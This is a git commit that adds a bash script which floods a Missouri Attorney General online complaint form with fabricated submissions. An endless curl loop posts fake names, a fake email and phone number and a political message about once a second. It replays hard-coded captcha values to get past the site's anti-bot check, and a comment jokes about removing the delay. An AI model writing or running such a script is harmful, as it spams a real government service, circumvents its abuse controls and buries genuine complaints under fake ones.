7782649c42fe90013c3f43caef026d88c8c5d0b3
Kaitlin <67394719+TheMemeSniper@users.noreply.github.com>
2023-03-26 21:25:19 -0500

    Create troll.bash

---
+++ troll.bash
@@ -0,0 +1,62 @@
+#!/usr/bin/env -S bash
+
+while :
+do
+curl -X POST https://ago.mo.gov/file-a-complaint/transgender-center-concerns?sf_cntrl_id=ctl00%24MainContent%24C001 \
+    -H "Content-Type: application/json" \
+    -d "-----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_4"
+
+    Bofa
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_5"
+
+    Deez
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_1"
+
+    Trans rights
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_2"
+
+    Are human rights
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="DropdownListFieldController"
+
+    IA
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_6"
+
+    42069
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_0"
+
+    trans@rights.lgbt
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="TextFieldController_3"
+
+    1231231234
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="ParagraphTextFieldController"
+
+    Transgender rights are human rights, and it's concerning that Missouri is trying to violate the life, liberty, and property of its citizens.
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="captcha-a"
+
+    G0F4F
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="captcha-ca"
+
+    0T8RdQ14SuBo+AwbKzo+SkK+O+I=
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="captcha-iv"
+
+    Uyz4dFgrrvUd6EGmyovZtQ==
+    -----------------------------58485654922338062751648543285
+    Content-Disposition: form-data; name="captcha-k"
+
+    MehikCjUYcIvALJJsePG3nb1nPO89AgWpTOsvj5tOTtxvcM7gyxQKypUcUM2LfWtBpejQ4BQpvFd3nraohhgbw==
+    -----------------------------58485654922338062751648543285--"
+    sleep 1 # i sure hope nobody removes this from the script
+done
+
